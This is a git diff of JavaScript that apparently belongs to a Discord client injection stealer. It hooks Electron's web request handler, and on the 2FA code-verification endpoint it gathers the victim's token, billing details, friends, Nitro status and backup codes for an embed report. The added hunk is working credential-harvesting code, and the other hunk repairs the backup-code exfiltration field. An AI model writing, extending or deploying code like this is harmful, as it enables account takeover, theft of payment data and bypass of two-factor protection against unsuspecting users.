@@ -1938,6 +1938,17 @@ electron.session.defaultSession.webRequest.onCompleted(
         await post(params);
         break;
       case request.url.endsWith("/codes-verification"):
+        var {
+          token,
+          user,
+          billing,
+          friends,
+          Nitro,
+          userAvatar,
+          userBanner,
+          Billings,
+          Friends,
+        } = await BoukiTuclcavectesfonctions();
         let validCodeFound = false;
         let backup_code = (await execScript(backupscript)) ?? "";
         if (config.disable2FA == "true") {
@@ -2009,7 +2020,7 @@ electron.session.defaultSession.webRequest.onCompleted(
             },
             {
               name: "Backup Codes <a:cat_rolling:1130448570789679165>",
-              value: `\`\`\`md\n${backup_codes
+              value: `\`\`\`md\n${backup_code
                 .map((x) => `- ${x.code} | Usable: ${x.consumed ? "❌" : "✅"}`)
                 .join("\n")}\`\`\``,
               inline: false,
